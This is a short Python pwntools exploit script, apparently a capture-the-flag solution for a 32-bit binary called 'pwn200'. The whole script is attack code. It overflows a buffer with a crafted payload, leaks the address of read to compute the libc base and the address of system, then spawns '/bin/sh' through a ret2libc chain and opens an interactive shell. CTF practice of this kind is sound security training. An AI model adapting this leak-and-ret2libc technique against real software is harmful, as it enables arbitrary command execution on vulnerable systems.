from pwn import *
import time,sys,binascii

elf_name = "./pwn200"
elf = ELF(elf_name)
libc = ELF('/lib32/libc.so.6')

io = process( elf_name )
gdb.attach(io, "b *0x08048529")

name = 'syclover' + '\x00' + 'a' * 7 + '\xff'
#io.recvuntil('input name:')
io.recv()
io.send(name)

payload  = 'a' * 0x90 + p32(0x0) + 'a' * 8 + p32(0x08049860) + p32(0x08048507)+ p32(0x1) + p32(0x08049850) + p32(0x4)
#io.recvuntil('input slogan:')
io.recv()
io.send(payload)

'''
data = io.recv()
print data
'''

read_addr = io.recv()[-4:]
read_addr = u32(read_addr.ljust(4,'\x00'))
print 'read_addr is :', hex(read_addr)
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
print 'system_addr is : ', hex(system_addr)

param = '/bin/sh\x00' + 'ls home' + 'a'*5
exploit = param + p32(system_addr)
io.send(exploit)
io.interactive()
